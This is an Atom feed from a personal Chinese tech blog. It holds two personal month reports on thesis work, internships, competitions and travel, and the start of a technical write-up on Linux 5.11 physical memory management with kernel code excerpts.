<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Humoooor&#39;s Blog</title>
  
  
  <link href="https://humoooor.cn/atom.xml" rel="self"/>
  
  <link href="https://humoooor.cn/"/>
  <updated>2024-01-08T13:57:03.255Z</updated>
  <id>https://humoooor.cn/</id>
  
  <author>
    <name>Humoooor</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2024.01</title>
    <link href="https://humoooor.cn/2024/01/08/2024.01/"/>
    <id>https://humoooor.cn/2024/01/08/2024.01/</id>
    <published>2024-01-08T09:58:00.000Z</published>
    <updated>2024-01-08T13:57:03.255Z</updated>
    
    <content type="html"><![CDATA[<p>重启的章节</p><span id="more"></span><h2 id="Week-14-2024-01-01-2024-01-07"><a href="#Week-14-2024-01-01-2024-01-07" class="headerlink" title="Week 14 (2024.01.01 - 2024.01.07)"></a>Week 14 (2024.01.01 - 2024.01.07)</h2><p>过完愉快的一周，又是做毕设的一周，这周的任务：如何同时在 Qemu 和虚拟机中同时获取一个进程的标志符号（比如 PID、页表地址或命令行参数等），导师说不难，但是得好好做，我感觉还是挺难的，而且麻烦，从虚拟机里获取了 PID，那要怎么从 Qemu 获取，从 Qemu 获取了页表地址，那要怎么从虚拟机里找到这个进程的页表地址，最终还是选择了一个比较麻烦的方案：页表地址，Qemu 里比较容易获取，直接通过 vCPU 结构体拿就行，但是从虚拟机里，需要写一个内核模块，调用内核的 API 通过进程的 PID 来获取</p><p>第一次去练科目二，yysy，自己还是有天赋了，被教练夸第一天就练得很好，不过有好几次速度太快，没控制好方向，差点开到路外面去了 :)</p><p>了解到了古代的一种游戏，射覆，会玩的人真牛逼，等书到了好好学一学基础，据说（孔子说的）这玩意越早学越好，子曰：“加我数年，五十以学易，可以无大过矣。”——《论语》</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;重启的章节&lt;/p&gt;</summary>
    
    
    
    <category term="Month Report" scheme="https://humoooor.cn/categories/Month-Report/"/>
    
    
  </entry>
  
  <entry>
    <title>2023.07 - 2023.12</title>
    <link href="https://humoooor.cn/2024/01/04/2023.07%20-%202023.12/"/>
    <id>https://humoooor.cn/2024/01/04/2023.07%20-%202023.12/</id>
    <published>2024-01-04T12:13:00.000Z</published>
    <updated>2024-01-05T07:43:48.415Z</updated>
    
    <content type="html"><![CDATA[<p>遗失的章节</p><span id="more"></span><h2 id="关于我为什么断更了半年"><a href="#关于我为什么断更了半年" class="headerlink" title="关于我为什么断更了半年"></a>关于我为什么断更了半年</h2><ul><li>七、八月：实习去了，实习也有周报，可能就懒得写了</li><li>九、十月：忙着找工作，急死了</li><li>十一、十二月：忘了 &amp; 懒 :)</li></ul><p>以下内容都是本人及相册的回忆，如有雷同，纯属偶然</p><h2 id="Month-7"><a href="#Month-7" class="headerlink" title="Month 7"></a>Month 7</h2><p>在实习干活，本来是被分配到 Web 安全测试，Java 看不了一点，后面申请能不能干别的，还好分到容器安全了，然后跟我说上午干测试，下午干容器（我：？）。所幸最终还是到了容器安全小组去了，学容器和内核，芜湖</p><p>食堂这个东西始终是只有新鲜感，大概吃了一圈，就感觉没啥好吃的了，而且公司的食堂还挺贵的，稍微吃点好的就 20 起步，但是早餐半价是真香</p><p>还去西交打了个比赛，躺了个二等奖，🦶✌还是强</p><h2 id="Month-8"><a href="#Month-8" class="headerlink" title="Month 8"></a>Month 8</h2><p>实习答辩了两次，第一次没怎么准备，做完 ppt 就回学校了，第二天直接上场，有点语无伦次，而且细节讲的有点多，不过分不算太低；第二次算是准备比较充足，也比较流畅，最后从原理上复现了一个 CVE，也算是圆满结束了。辉总还问我要不要继续待下来干活，比较缺人，感觉两个月也差不多了，就婉拒了</p><p>这次实习主要是学到技术上的东西，第一次接触到容器和内核安全，第一次做答辩 PPT</p><p>yysy，公司里人才辈出，甚至有机会和一位清华博士✌一起工作，而且里面的技术氛围也很强，里面有外面看不到的知识分享，资源很丰富强大，希望以后也能进入这样的公司，会很幸运</p><h2 id="Month-9"><a href="#Month-9" class="headerlink" title="Month 9"></a>Month 9</h2><p>几天把 TX 的项目中期搞完了，主要是涉及 ARM 和嵌入式开发，不算太难</p><p>实习结束，去找对象玩了几天捏😘</p><p>当时找工作真的很急，错过了一次线下招聘会，没想到后面就没有什么大型招聘会了，官网投了几十家，某四字母软件也投了不少，总共大概有一百多家吧，面试的寥寥无几，而且基本都挂了</p><p>暂时只有岳阳电信肯收留我，不胜感激，不过工资不高，小县城有个七八千，也想过直接去那小县城，工资不算低，包吃，干个十年左右也能在当地买个小房子，但是感觉对不起这个学历，而且女朋友也觉得这样抗风险能力比较弱，就还是婉拒了</p><h2 id="Month-10"><a href="#Month-10" class="headerlink" title="Month 10"></a>Month 10</h2><p>TX 的项目再稍微改改，虽然有点小 bug，但是答辩完了，拿了点小奖金，嘻嘻(#^.^#)</p><p>TPLink 发 Offer 了，人生第一个正式工作 Offer，而且给的不低，我哭死，虽然是在上海，租房大概 2500，挺贵的，估计一个月的吃住就要花掉 4000，而某遥遥领先迟迟不开，已经是遥遥落后了，犹豫了几天，最终还是选择签了保底，身在 TP 心在 ❀ 属于是</p><h3 id="工业互联网安全大赛初赛"><a href="#工业互联网安全大赛初赛" class="headerlink" title="工业互联网安全大赛初赛"></a>工业互联网安全大赛初赛</h3><p>又去参加了一个比赛，贼水，一个运维比赛，第一场理论考试，把选择题做完还有一个小时时间，以为做完了，准备润了，刚好一个队友去上厕所了，我就去平台上瞎点，发现还有 CTF 题，原以为是下一场的题泄题了，想着现在下载下来回去做，后来一问发现就是这场考试的，还好我机智（，做完发现同校另一队剩下时间在那打游戏,最后半小时才发现有题，就做了两三题，难蚌</p><p>第二场实操，就对着题目和文档一个一个做，基本都是运维题，没啥意思，还累死，还好最后拿了个省一，有点奖金，进国赛了捏</p><h3 id="线下面试-amp-旅游"><a href="#线下面试-amp-旅游" class="headerlink" title="线下面试 &amp; 旅游"></a>线下面试 &amp; 旅游</h3><p>某银行要线下面试，正好免一趟路费，就去杭州玩了玩，不过面试寄了，i 人真的不会辩论</p><p>西湖真的很大，走了两天都没走完（我不是特种兵），天天走到脚痛😇，后面实在是走不动了，走一会歇一会</p><p>不过那几天运气不错，天气挺好，拍到很好看的夕阳，还有某音主播在直播，虽然好像没什么人气</p><p>还去了净慈禅寺，拍到了雷峰塔（下面真的有白娘子吗），据说净慈禅寺是济公晚年居住的地方，还留下了运木古井，可惜那时候我没怎么看过济公，没去看看那口井</p><p>本来还想去亚运会奥体中心，可惜那段时间不开，失策了，就去旁边的钱塘江上走了走，哈哈，还是累得不行</p><p>去吃了一家油爆虾，好吃，但是很贵，乖乖，一个人吃了二伯</p><h3 id="国学"><a href="#国学" class="headerlink" title="国学"></a>国学</h3><p>开始对中医感兴趣，去看中医基础理论的网课，学到了阴阳五行学说，挺有意思的，也开始每天早上练八段锦</p><h2 id="Month-11"><a href="#Month-11" class="headerlink" title="Month 11"></a>Month 11</h2><h3 id="工业互联网安全大赛决赛"><a href="#工业互联网安全大赛决赛" class="headerlink" title="工业互联网安全大赛决赛"></a>工业互联网安全大赛决赛</h3><p>这次去了绍兴，路费和住宿全免，过去坐飞机，天气很好，能拍到很好看的景色，山雾缭绕</p><p>比赛挺盛大的，但是过程真的很难蚌，比赛一开始照着要求配网络环境，配了快一个小时还是有问题，然后一个队友观察了其他队伍发现他们的机器灯都是亮的，而我们的机器有的灯不亮，才发现原来网线没有查，难蚌了想直接开摆，后面直接从简单的开始做，最后拿了个国二，不过没有奖金</p><p>第一天晚上去了大文豪鲁迅故居参观参观，不愧是水乡，到处都是小河，绍兴是挺不错的一座城市</p><p>第二天下午又去了一趟西湖，刚到我就跟一个队友说，他肯定走不了多久就走不动了（因为去鲁迅故居那晚就是这样，前一天晚上三点睡，早上五点多起来赶飞机），他还不信，结果到傍晚就喊走不动了，笑死</p><h3 id="毕设"><a href="#毕设" class="headerlink" title="毕设"></a>毕设</h3><p>找了个计科院的老师，很牛，好像是自己开公司，做 qemu 安全防护，听着还挺有意思，不过要天天上班，朝九晚五，双休，还能摸鱼，yysy，要是以后工作也这样那就爽歪歪了</p><h3 id="国学-1"><a href="#国学-1" class="headerlink" title="国学"></a>国学</h3><p>第一次给自己针灸，扎合谷，有点痛，但是可以接受，很刺激，不知道有没有用，扎之前犹豫很久，找位置又比划很久，生怕扎错了位置，其实也没关系</p><h2 id="Mouth-12"><a href="#Mouth-12" class="headerlink" title="Mouth 12"></a>Mouth 12</h2><p>遥遥领先终于发 offer 了，13 级😭，但是薪资可以接受，而且东莞租房也不贵，准备违约 TPlink 了，感恩，秋招耽误了女朋友这么久，很愧疚，让她没能找到一个满意的工作，以后一定要好好上班赚钱，弥补她</p><p>去滑雪了，初中滑过一次双板，只记得脚扭的很痛，这次选单板，真的很帅，但是摔的也真的很痛</p><p>女朋友第一次来西安玩，去看了狐狸、猫猫、狗勾，还有蛇，还摸到了正宗的哈士奇，据说三四千呢，眼神确实很纯真；一起去吃了陕菜，虽然味道一般，但也是第一次尝到陕西菜；带她去学校逛了逛，买了点面包喂天鹅和鸭子，她真的很可爱（笑），还一起去踩湖上的冰（刚踩上去就看学校发了通知不要去踩，笑死）；潮汕牛肉还是好吃的，毕竟吃过的肯定不会踩坑</p><p>一起去商场看了华为和小米手机店，华为性价比真不行吧，还得是小米，明年一定要给她买一部手机；去抓娃娃，抓到了一个独眼兽，又去另一个电玩城一把抓到了一个海盗兔，不愧是我，还去 KTV 机子唱歌呢，瞎唱，但是开心，以后还要一起唱歌</p><p>最后送她去车站，又要分开了，感觉心里有点空落落的，本来想在车站给她拍个照，不肯，哼</p><p>期待下一次见面</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;遗失的章节&lt;/p&gt;</summary>
    
    
    
    <category term="Month Report" scheme="https://humoooor.cn/categories/Month-Report/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel 内存管理</title>
    <link href="https://humoooor.cn/2023/09/17/Linux%20Kernel%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>https://humoooor.cn/2023/09/17/Linux%20Kernel%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2023-09-17T14:26:00.000Z</published>
    <updated>2023-10-23T09:25:01.381Z</updated>
    
    <content type="html"><![CDATA[<p>Linux 5.11 内存管理</p><span id="more"></span><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ol><li>代码块的开头一般都标有代码的相对路径，根目录为源代码根目录</li><li>笔者尽可能会在代码块中每一行代码的上方进行注释，然后在代码块的下方总结该函数的行为</li></ol><h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><p>下面是本文和代码可能会用到的一些关键词，防止读者<del>（自己）</del>混淆</p><ul><li>页：一般指一页物理页，大小一般为 4 KB</li><li>页面：由一页或者多个连续页组成的内存区，为 Buddy System 的最小管理单位</li><li>partial page/slab：有空闲对象的页面</li><li>cpu slab：<code>kmem_cache_cpu-&gt;page</code> 指向的 slab</li><li>cpu partial slab：<code>kmem_cache_cpu-&gt;partial</code> 指向的 partial slab</li><li>node slab：<code>kmem_cache_node-&gt;partial</code> 指向的 partial slab</li><li><code>struct page new</code>：保存 <code>page</code> 新状态，更新 <code>page</code> 状态时使用</li><li><code>struct page old</code>：保存 <code>page</code> 旧状态，用于原子操作时保证单线程修改变量，防止条件竞争<ul><li>一般用于更新 <code>page-&gt;freelist</code> 和 <code>page-&gt;counters</code></li><li>有些代码可能会直接定义 <code>freelist</code> 或 <code>prior</code> 和 <code>counters</code> 变量来保存状态，作用都是一样的</li></ul></li><li><code>cmpxchg</code> 宏：一类原子操作的宏，用于防止条件竞争，会将值先与保存的原值进行比较，相等后再赋新值，如 <code>this_cpu_cmpxchg(pcp, oval, nval)</code> 相当于 <code>if(pcp == oval) pcp = nval</code></li></ul><h2 id="物理内存"><a href="#物理内存" class="headerlink" title="物理内存"></a>物理内存</h2><p>Linux 使用三级结构对物理内存进行管理</p><ul><li>Page<ul><li>页</li><li>物理内存最小的管理单元，也是虚拟内存映射到物理内存的最小单位</li></ul></li><li>Zone<ul><li>区</li><li>第二级结构，管理多个页</li></ul></li><li>Node<ul><li>节点</li><li>第一级结构，管理多个区</li></ul></li></ul><p><img src="/img/Linux_Kernel_%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.assets/physical_memory.png" alt="Physical Memory"></p><h3 id="Page"><a href="#Page" class="headerlink" title="Page"></a>Page</h3><p>Linux 使用 <code>page</code> 结构体来管理一个页，一般一页为 4KB</p><p>结构体的内容如下（结构体的定义在 <code>include/linux/mm_types.h</code> 中，这里就不把代码放出来凑字数了）</p><ul><li><code>flags</code><ul><li>标志位</li></ul></li><li><code>union1</code><ul><li>5 个字长</li><li>这个 union 根据 <code>page</code> 的不同用途，定义不同的结构体，节省内存</li></ul></li><li><code>union2</code><ul><li>memmap 管理</li></ul></li><li><code>_refcount</code><ul><li>使用计数</li></ul></li><li>其他扩展</li></ul><p>下面介绍比较重要的字段</p><h4 id="flags"><a href="#flags" class="headerlink" title="flags"></a><code>flags</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br></pre></td></tr></table></figure><p>标志位，每一位表示一种状态，状态 <code>enum pageflags</code> 在 <code>include/linux/page-flags.h</code> 中定义</p><ul><li><code>PG_locked</code><ul><li>该页上锁，正在被使用</li></ul></li><li><code>PG_referenced</code><ul><li>该页刚被访问过，与 <code>PG_reclaim</code> 用于匿名与文件备份缓存的页面回收</li></ul></li><li><code>PG_reclaim</code><ul><li>该页可以被回收</li></ul></li><li><code>PG_uptodate</code><ul><li>最新状态（up-to-date），该页被读后会变更为最新状态</li></ul></li><li><code>PG_dirty</code><ul><li>该页被修改过</li></ul></li><li><code>PG_lru</code><ul><li>该页在 LRU 链表上</li></ul></li><li><code>PG_active</code><ul><li>该页在活跃 LRU 链表上</li></ul></li><li><code>PG_workingset</code><ul><li>该页位于某个进程的工作集（working set，在某一时刻被使用的内存页）中</li></ul></li><li><code>PG_waiters</code><ul><li>有进程在等待该页</li></ul></li><li><code>PG_error</code><ul><li>该页在 I/O 过程中出现了差错</li></ul></li><li><code>PG_slab</code><ul><li>该页由 slab 使用</li></ul></li><li><code>PG_owner_priv_1</code><ul><li>该页由其所有者使用，若是作为 pagecache 页面，则可能是被文件系统使用</li></ul></li><li><code>PG_arch_1</code><ul><li>该页与体系结构相关联</li></ul></li><li><code>PG_reserved</code><ul><li>该页被保留，不能够被 swap out（内核会将不活跃的页交换到磁盘上）</li></ul></li><li><code>PG_private</code> &amp;&amp; <code>PG_private2</code><ul><li>该页拥有私有数据（private 字段）</li></ul></li><li><code>PG_writeback</code><ul><li>该页正在被写到磁盘上</li></ul></li><li><code>PG_head</code><ul><li>该页是复合页（compound pages）的第一个页</li></ul></li><li><code>PG_mappedtodisk</code><ul><li>该页被映射到硬盘中</li></ul></li><li><code>PG_swapbacked</code><ul><li>该页的后备存储器为 swap/RAM</li></ul></li><li><code>PG_unevictable</code><ul><li>该页不可被回收（被锁），且会出现在 <code>LRU_UNEVICTABLE</code> 链表中</li></ul></li><li><code>PG_mlocked</code><ul><li>该页被对应的 vma 上锁（通常是系统调用 mlock）</li></ul></li><li><code>PG_uncached</code><ul><li>该页被设置为不可缓存</li></ul></li><li><code>PG_hwpoison</code><ul><li>硬件相关的标志位</li></ul></li><li><code>PG_arch_2</code>：64位下的体系结构相关标志位</li></ul><h4 id="mapcount"><a href="#mapcount" class="headerlink" title="_mapcount "></a><code>_mapcount </code></h4><p>该字段在 <code>union2</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span> _mapcount;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> page_type;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line">    <span class="type">int</span> units;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>映射计数，该页被页表映射的次数，可以理解为有多少个进程共享这一页</p><h4 id="refcount"><a href="#refcount" class="headerlink" title="_refcount"></a><code>_refcount</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">atomic_t</span> _refcount;</span><br></pre></td></tr></table></figure><p>引用计数，该页在某一个时刻被引用的个数</p><p>内核使用 <code>get_page</code> 函数增加引用计数，<code>put_page</code> 函数减少引用计数，当引用计数为 0 时，会调用 <code>__put_single_page</code> 释放该页</p><h4 id="virtual"><a href="#virtual" class="headerlink" title="virtual"></a><code>virtual</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *virtual;</span><br></pre></td></tr></table></figure><p>该页在<strong>内核</strong>中被映射的虚拟地址</p><h4 id="基础内存模型"><a href="#基础内存模型" class="headerlink" title="基础内存模型"></a>基础内存模型</h4><p>Linux 定义了三种内存模型，定义在 <code>include/asm-generic/memory_model.h</code> 中</p><p>#todo 做一张内存模型的图</p><h5 id="Flat-Memory"><a href="#Flat-Memory" class="headerlink" title="Flat Memory"></a>Flat Memory</h5><p>平滑内存模型，顾名思义，所有的物理内存地址连续，一个 <code>page</code> 数组 <code>mem_map</code> 全局变量来表示对应的所有物理内存</p><h5 id="Discontiguous-Memory"><a href="#Discontiguous-Memory" class="headerlink" title="Discontiguous Memory"></a>Discontiguous Memory</h5><p>非连续内存模型，顾名思义，物理内存地址不完全连续，内存之间存在<strong>空洞（hole）</strong></p><p>每一段连续物理内存由 <code>pglist_data</code> 结构体表示，结构体中 <code>node_mem_map</code> 字段为一个 <code>page</code> 数组，该数组对应这一段连续物理内存</p><p>再往上一层，有一个 <code>pglist_data</code> 指针数组 <code>node_data</code> 全局变量来存放每个 <code>pglist_data</code> 的地址</p><h5 id="Sparse-Memory"><a href="#Sparse-Memory" class="headerlink" title="Sparse Memory"></a>Sparse Memory</h5><p>离散内存模型，该内存模型相当于<strong>可热插拔</strong>的非连续内存模型，是最常用的基础内存模型</p><p>物理内存以 <strong>section</strong>（节）为单位进行管理，每一段连续物理内存由 <code>mem_section</code> 结构体中的 <code>section_mem_map</code> 对应</p><blockquote><p><code>section_mem_map</code> 本身是一个 unsigned long 变量，可以通过 <code>section_mem_map &amp; SECTION_MAP_MASK</code> 来获取对应的 section 首地址，内核中用 <code>__section_mem_map_addr</code> 函数表示这一操作</p></blockquote><p>再往上一层，有一个 <code>mem_section</code> 二维数组 <code>mem_section</code>（同名）存放每个 <code>mem_section</code> 的实体或地址，这个二维数组大小可以是固定的，也可以是动态的（<code>struct mem_section **mem_section</code>，一般在 section 比较多的情况下需要开启 CONFIG_SPARSEMEM_EXTREME），指针可能为空</p><figure class="highlight c"><figcaption><span>mm/sparse.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> **<span class="title">mem_section</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> <span class="title">mem_section</span>[<span class="title">NR_SECTION_ROOTS</span>][<span class="title">SECTIONS_PER_ROOT</span>]</span></span><br><span class="line"><span class="class">    ____<span class="title">cacheline_internodealigned_in_smp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> SECTIONS_PER_ROOT (PAGE_SIZE / sizeof (struct mem_section))</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> SECTIONS_PER_ROOT 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>固定和动态大小的二维数组 <code>mem_section</code> 布局是不同的</li><li>固定大小的 <code>mem_section</code> 实际上是一个一维指针数组<ul><li>第二维的大小 SECTIONS_PER_ROOT 为 1</li></ul></li><li>动态大小的 <code>mem_section</code> 是实实在在的二维数组<ul><li>第二维的大小 SECTIONS_PER_ROOT，即一页所能存放的 <code>mem_section</code> 结构体的个数</li><li>也就是说，<code>mem_section</code> 会连续存储在一页中，并且有多个页来存储 <code>mem_section</code>，也表明 section 数量也确实多</li></ul></li></ul><p>下图为固定大小的 <code>mem_section</code></p><p><img src="/img/Linux_Kernel_%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.assets/mem_section_fixed.png" alt="mem_section_fixed"></p><p>下面是动态大小的 <code>mem_section</code></p><p><img src="/img/Linux_Kernel_%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86.assets/mem_section_dynamic.png" alt="mem_section_dynamic"></p><h4 id="PFN-与-page-地址的转换"><a href="#PFN-与-page-地址的转换" class="headerlink" title="PFN 与 page 地址的转换"></a>PFN 与 <code>page</code> 地址的转换</h4><p>在内核中常会用到 PFN（页帧号 Page Frame Number） 来简单表示一个页（而不是用复杂的 <code>page</code> 指针地址表示），可以理解为该页在物理内存的位置号，使用上会涉及到 PFN 与 <code>page</code> 地址之间的转换 <code>__page_to_pfn</code> 和 <code>__pfn_to_page</code></p><p>这里只讲 Sparse Memory 的转换，宏定义位于 <code>include/linux/memory_model</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SPARSEMEM)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __page_to_pfn(pg)\</span></span><br><span class="line"><span class="meta">(&#123;const struct page *__pg = (pg);\</span></span><br><span class="line"><span class="meta">int __sec = page_to_section(__pg);\</span></span><br><span class="line"><span class="meta">(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __pfn_to_page(pfn)\</span></span><br><span class="line"><span class="meta">(&#123;unsigned long __pfn = (pfn);\</span></span><br><span class="line"><span class="meta">struct mem_section *__sec = __pfn_to_section(__pfn);\</span></span><br><span class="line"><span class="meta">__section_mem_map_addr(__sec) + __pfn;\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>注意 <code>mem_section</code> 的 <code>section_mem_map</code> 是等于该 section 第一个 <code>page</code> 的地址减去 section 第一个 <code>page</code> 对应的页在物理内存中的位置号 start_pfn</p><p>由此可以得到下面的公式</p><p>$$<br>PFN = index_{page} + start_pfn = addr_{page} - addr_{section_first_page} + start_pfn = addr_{page} - section_mem_map<br>$$</p><h5 id="page-地址-gt-PFN"><a href="#page-地址-gt-PFN" class="headerlink" title="page 地址 -&gt; PFN"></a><code>page</code> 地址 -&gt; PFN</h5><p>首先使用 <code>page_to_section</code> 通过 <code>page</code> 的 <code>flags</code> 字段该页所属 section 号</p><figure class="highlight c"><figcaption><span>include/linux/mm.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">page_to_section</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (page-&gt;flags &gt;&gt; SECTIONS_PGSHIFT) &amp; SECTIONS_MASK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用 <code>__nr_to_section</code> 获取对应的 <code>mem_section</code> 结构体地址</p><figure class="highlight c"><figcaption><span>include/linux/mmzone.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">nr_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">nr</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line">    <span class="keyword">if</span> (!mem_section)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (!mem_section[SECTION_NR_TO_ROOT(nr)])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;mem_section[SECTION_NR_TO_ROOT(nr)][nr &amp; SECTION_ROOT_MASK];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECTION_NR_TO_ROOT(sec) ((sec) / SECTIONS_PER_ROOT)</span></span><br></pre></td></tr></table></figure><p><code>SECTION_NR_TO_ROOT</code> 是计算该 section 在二维数组的第一个下标，与 SECTION_ROOT_MASK 做与运算，获取在二维数组的第二个下标</p><p>然后使用 <code>__section_mem_map_addr</code> 获取 <code>page</code> 所在 section 的 <code>section_mem_map</code></p><figure class="highlight c"><figcaption><span>include/linux/mmzone.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">section_mem_map_addr</span>(<span class="keyword">struct</span> <span class="title">mem_section</span> *<span class="title">section</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="built_in">map</span> = section-&gt;section_mem_map;</span><br><span class="line">    <span class="comment">// 去掉标志位</span></span><br><span class="line">    <span class="built_in">map</span> &amp;= SECTION_MAP_MASK;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> page *)<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后作差即可得到 PFN</p><h5 id="PFN-gt-page-地址"><a href="#PFN-gt-page-地址" class="headerlink" title="PFN -&gt; page 地址"></a>PFN -&gt; <code>page</code> 地址</h5><p>先通过 <code>__pfn_to_section</code> 将 pfn 转换成对应的 section</p><figure class="highlight c"><figcaption><span>include/linux/mmzone.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">pfn_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">pfn</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">return</span> __nr_to_section(pfn_to_section_nr(pfn));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">pfn_to_section_nr</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> pfn)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> pfn &gt;&gt; PFN_SECTION_SHIFT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中会调用 <code>pfn_to_section_nr</code> 获取所属 section 号，再通过 <code>__nr_to_section</code> 获取 <code>mem_section</code> 地址</p><p>然后使用 <code>__section_mem_map_addr</code> 获取 <code>page</code> 所在 section 的 <code>section_mem_map</code></p><p>最后相加即可得到 <code>page</code> 地址</p><h4 id="Sparse-Memory-Virtual-Memmap"><a href="#Sparse-Memory-Virtual-Memmap" class="headerlink" title="Sparse Memory Virtual Memmap"></a>Sparse Memory Virtual Memmap</h4><p>这是 Linux 最常用的内存模型之一</p><p>开启虚拟地址空间到物理地址空间的映射，虚拟地址空间的所有页都是连续的，所有的 <code>page</code> 